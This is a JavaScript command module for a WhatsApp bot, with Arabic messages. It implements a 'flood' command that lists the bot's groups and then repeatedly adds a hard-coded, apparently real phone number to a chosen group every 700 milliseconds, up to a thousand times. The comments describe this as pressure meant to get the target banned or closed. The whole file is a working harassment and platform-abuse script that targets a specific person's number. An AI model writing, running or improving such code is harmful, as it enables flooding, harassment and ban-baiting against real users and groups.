module.exports = {
    name: 'تبنيد',
    async execute(sock, m, args) {
        const jid = m.key.remoteJid;
        const sub = args?.[0]?.trim();

        if (!global.activeSpams) {
            global.activeSpams = new Map();
        }

        // الأرقام المستهدفة للضغط
        const TARGET_NUMBERS = [
            '201128344087',
        ];

        // 1. أمر إيقاف الإغراق
        if (sub === 'ايقاف' || sub === 'stop') {
            if (global.activeSpams.has(jid)) {
                global.activeSpams.set(jid, false);
                return sock.sendMessage(jid, { text: '🛑 [ABORT] تم إيقاف عملية الإغراق بنجاح.' }, { quoted: m });
            }
            return sock.sendMessage(jid, { text: '⚠️ [SYSTEM] لا توجد عملية إغراق نشطة حالياً.' }, { quoted: m });
        }

        const groups = Object.values(await sock.groupFetchAllParticipating());

        // 2. إذا لم يحدد رقماً، اعرض القائمة مع طريقة الاستخدام
        if (!sub || isNaN(parseInt(sub))) {
            let text = '📋 *قائمة المجموعات المستهدفة للإغراق*\n\n';
            groups.forEach((g, i) => {
                text += `*${i + 1}.* ${g.subject || 'بدون اسم'}\n`;
                text += `👥 الأعضاء: ${g.participants?.length || 0}\n\n`;
            });
            text += '💻 *للبدء:* أرسل `.تبنيد <رقم_المجموعة>`\n🛑 *للإيقاف:* أرسل `.تبنيد ايقاف`';

            return sock.sendMessage(jid, {
                text: groups.length ? text : '⚠️ لا توجد مجموعات.'
            }, { quoted: m });
        }

        const groupIndex = parseInt(sub) - 1;
        if (groupIndex < 0 || groupIndex >= groups.length) {
            return sock.sendMessage(jid, { text: '❌ رقم المجموعة غير صحيح. استخدم `.تبنيد` لرؤية القائمة.' }, { quoted: m });
        }

        const targetGroup = groups[groupIndex];
        const targetJid = targetGroup.id;

        global.activeSpams.set(jid, true);

        await sock.sendMessage(jid, {
            text: `⚠️ [EXECUTION] تم قفل الهدف: *${targetGroup.subject}*\n` +
                  `🔥 الحالة: *الإغراق نشط الآن*\n\n` +
                  `🛑 للإيقاف، أرسل: \`.تبنيد ايقاف\``,
        }, { quoted: m });

        // تفعيل حلقة الضغط والإغلاق الفعلية
        (async () => {
            let count = 0;
            while (global.activeSpams.get(jid) === true) {
                try {
                    const rawNum = TARGET_NUMBERS[count % TARGET_NUMBERS.length];
                    const targetUserJid = `${rawNum}@s.whatsapp.net`;

                    await sock.groupParticipantsUpdate(targetJid, [targetUserJid], 'add');
                    count++;
                    
                    await new Promise(resolve => setTimeout(resolve, 700));
                } catch (err) {
                    await new Promise(resolve => setTimeout(resolve, 400));
                }

                if (count > 1000) break;
            }
            global.activeSpams.set(jid, false);
        })();
    }
};
